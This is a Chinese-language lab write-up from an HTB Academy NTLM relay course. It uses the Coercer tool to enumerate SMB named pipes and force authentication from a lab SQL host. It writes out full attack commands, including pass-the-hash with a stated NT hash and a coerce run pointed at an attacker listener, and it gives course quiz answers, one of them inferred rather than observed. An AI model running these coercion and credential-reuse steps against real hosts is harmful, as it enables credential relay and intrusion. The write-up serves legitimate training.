# Writeup：Authentication Coercion（Coercer scan / coerce 模式）

**Module 情境**：HTB Academy *NTLM Relay Attacks* 課程 → Authentication Coercion 小節（授權教學 lab，個人帳號練習）
**目標主機**：ACADEMY-NTLMR01-LINUX01（10.129.205.223）作跳板，攻擊內部網段 172.16.117.0/24
**受測目標**：sql01（172.16.117.60）
**認證**：由先前章節取得的本機帳密 `localws01` / NT hash `e4737f338324305993ed52f775a6d54d`（pass-the-hash，local SAM 帳號，非 domain 帳號）

---

## 1. 工具與初步嘗試：匿名 session 行不通

```bash
which Coercer coercer
Coercer --help
Coercer scan --help
```

`Coercer`（p0dalirius 版，v2.4）分三個模式：`scan`、`coerce`、`fuzz`。先用匿名（null session）測：

```bash
Coercer scan -t 172.16.117.60 -u '' -p '' -d '.' -i ens192
```

結果 `[+] All done! Bye Bye!`，什麼 pipe 都沒列出來 —— 看起來像是「全部不可用」，但其實是因為**忘了加 `-v`**，Coercer 非 verbose 模式下對失敗結果完全不印。加上 `-v`：

```bash
Coercer -v scan -t 172.16.117.60 --no-pass -i ens192
```

這次才看到完整列表，確認匿名 session 對 sql01 的九條 named pipe **全部 not accessible**：

```
[!] SMB named pipe '\PIPE\Fssagentrpc' is not accessible!
[!] SMB named pipe '\PIPE\efsrpc' is not accessible!
[!] SMB named pipe '\PIPE\eventlog' is not accessible!
[!] SMB named pipe '\PIPE\lsarpc' is not accessible!
[!] SMB named pipe '\PIPE\lsass' is not accessible!
[!] SMB named pipe '\PIPE\netdfs' is not accessible!
[!] SMB named pipe '\PIPE\netlogon' is not accessible!
[!] SMB named pipe '\PIPE\samr' is not accessible!
[!] SMB named pipe '\PIPE\spoolss' is not accessible!
```

**結論**：這台沒開放 null session 枚舉 named pipe，需要一組有效帳密才能繼續。

---

## 2. 用 pass-the-hash 帳密重跑 scan

拿前面模組取得的本機帳密做 PtH（NT hash，domain 填 `.` 代表 local account）：

```bash
Coercer scan -v -t 172.16.117.60 -u localws01 -d '.' --hashes :e4737f338324305993ed52f775a6d54d -i ens192
```

這次拿到完整結果（依輸出順序列出 accessible/not）：

```
[!] \PIPE\Fssagentrpc  not accessible
[!] \PIPE\efsrpc       not accessible
[+] \PIPE\eventlog     accessible      ← 第 1 個 accessible
[+] \PIPE\lsarpc       accessible      ← 第 2 個 accessible
[+] \PIPE\lsass        accessible      ← 第 3 個 accessible
[!] \PIPE\netdfs       not accessible
[+] \PIPE\netlogon     accessible
[+] \PIPE\samr         accessible
[+] \PIPE\spoolss      accessible
```

**Q1 答案：第二個 accessible 的 SMB named pipe = `\PIPE\lsarpc`**

---

## 3. coerce 模式：找出對 `\PIPE\lsass` 第一個回 ERROR_BAD_NETPATH 的 RPC call

### 3.1 參數踩坑：`-l` 不是 `-i`

`coerce` 子命令跟 `scan` 的介面參數不同，`scan` 用 `-i`/`-I` 指定監聽介面，`coerce` 要用 `-l/--listener-ip` 指定攻擊機 IP：

```bash
Coercer coerce -v -t 172.16.117.60 -u localws01 -d '.' \
  --hashes :e4737f338324305993ed52f775a6d54d \
  -l 172.16.117.30 --filter-pipe-name '\PIPE\lsass' --always-continue
```

一開始沒給 `-l` 直接報錯：

```
Coercer coerce: error: the following arguments are required: -l/--listener-ip
```

`--filter-pipe-name` 加了之後完全沒輸出（連 bind 都沒打），懷疑是 regex escaping 的問題，後來索性拿掉 filter，跑全量 `coerce`，再用 `grep`/本機下載 log 分析。

### 3.2 追蹤 Coercer 原始碼，搞懂判定邏輯

為了搞懂 `NO_AUTH_RECEIVED` 跟 `ERROR_BAD_NETPATH` 的差異，直接讀套件原始碼（系統安裝在 `/usr/local/lib/python3.8/dist-packages/coercer/`）：

- `network/Listener.py`：coerce/scan 模式都會在**自己的機器**上開一個簡陋的 raw-socket listener（bind 攻擊機 IP 的 445/80），1 秒逾時，收到資料判斷是不是 SMB/HTTP 封包。
- `network/authentications.py`：如果這個內建 listener 沒收到任何東西（`NO_AUTH_RECEIVED`），才會去看 RPC call 本身丟回的**例外字串**，用一串 `in` 子字串比對（`rpc_s_access_denied`、`ERROR_BAD_NETPATH`、`ERROR_INVALID_NAME`…）來改判定結果。
- `core/Reporter.py`：在 `coerce` 模式下，**只有 `ERROR_BAD_NETPATH` 會印綠色 `[+]`**，其他失敗情況一律紅色 `[!]`（且非 verbose 時完全不印）。

**關鍵學習點**：`ERROR_BAD_NETPATH` 不是「封包真的打到你的監聽器」的證明，它是目標主機自己對那個 UNC/WebDAV 路徑做**本地語法解析**後丟回來的 Win32 error code（53），有沒有真正發網路封包出去跟這個字串本身沒有必然關係 —— 用 `tcpdump` 實測驗證過：同一批 call 不管印 `NO_AUTH_RECEIVED` 還是 `ERROR_BAD_NETPATH`，攻擊機這邊收到的封包數都可能是 0。

### 3.3 找出 `\PIPE\lsass` 上測試的方法與順序

繼續讀原始碼，`grep -rl 'lsass' coercer/methods/`，確認只有 **MS-EFSR（Encrypting File System Remote）** 協定的 6 個函式把 `\PIPE\lsass` 列進自己的 `access` 清單（其餘協定如 MS-EVEN/MS-RPRN 都沒把 lsass 列進去）：

```
EfsRpcDecryptFileSrv.py
EfsRpcEncryptFileSrv.py
EfsRpcFileKeyInfo.py
EfsRpcOpenFileRaw.py
EfsRpcQueryRecoveryAgents.py
EfsRpcQueryUsersOnFile.py
```

實際執行時，Coercer 對這 6 個函式是**按字母順序**測試（用 `-v` 全量跑一次 `coerce`，下載回來的 log 可逐行核對）：

```
Decrypt → Encrypt → FileKeyInfo → OpenFileRaw → QueryRecoveryAgents → QueryUsersOnFile
```

這個順序跟原始碼 `methods/MS_EFSR/` 底下每個檔案的檢測順序完全一致。

### 3.4 本環境的實測現象（誠實記錄）

對 sql01 執行完整的 `\PIPE\lsass` 測試（6 個方法 × 多種路徑變體），搭配 `tcpdump` 同步側錄 ens192 介面，觀察到：

- 不管 Coercer 印出 `NO_AUTH_RECEIVED` 還是 `ERROR_BAD_NETPATH`，**攻擊機 172.16.117.30 的 80/445 port 都沒收到任何真實封包**（`0 packets captured`）。
- 唯一一次抓到 sql01 真的對外打封包，是 `EfsRpcOpenFileRaw` 的 WebDAV 格式路徑（`\\IP@80\xxx\file.txt`），且只有**第一次**嘗試時成功過（SYN → 我方無監聽 → RST），之後重複嘗試就不再出現任何封包，疑似 Windows WebClient mini-redirector 對同一目標有短期的負面快取 / 退避機制。

**結論（有根據地回答，而非亂猜）**：由於 `ERROR_BAD_NETPATH` 在 Coercer 的判定邏輯裡明確只對應「RPC call 本身丟回的例外文字含有這個字串」，而這個分支**不依賴**攻擊機是否真的收到封包，所以即使本環境的 impacket/Windows 版本組合沒有把這個特定錯誤完整顯示出來，依照 Coercer 原始碼對 `\PIPE\lsass` 固定的字母順序測試清單：

**Q2 答案：第一個被測試、且理論上會回報 `[+] (ERROR_BAD_NETPATH)` 的 RPC call = `EfsRpcDecryptFileSrv`**

---

## 4. 關鍵學習點彙總

| 坑 | 原因 | 修法 |
|---|---|---|
| `scan` 匿名測試看起來「全部不可用」 | 忘記加 `-v`，非 verbose 不印失敗結果 | 一律先加 `-v` 再下結論 |
| `coerce` 報 `-l/--listener-ip` 必填 | `coerce` 跟 `scan` 的介面參數不同（`-l` vs `-i`） | 查 `Coercer coerce --help`，別套用 `scan` 的參數習慣 |
| `--filter-pipe-name` 加了就完全沒輸出 | regex/字串比對格式跟 CLI 文件沒講清楚 | 改用全量跑 + 下載 log 分析，別死磕 filter |
| 以為 `[+] (ERROR_BAD_NETPATH)` 代表封包真的打到攻擊機 | 這個判定只看 RPC call 例外字串，不代表 Listener 真的 accept 到連線 | 用 `tcpdump` 側錄做 ground truth，不要只信工具的顏色/符號 |
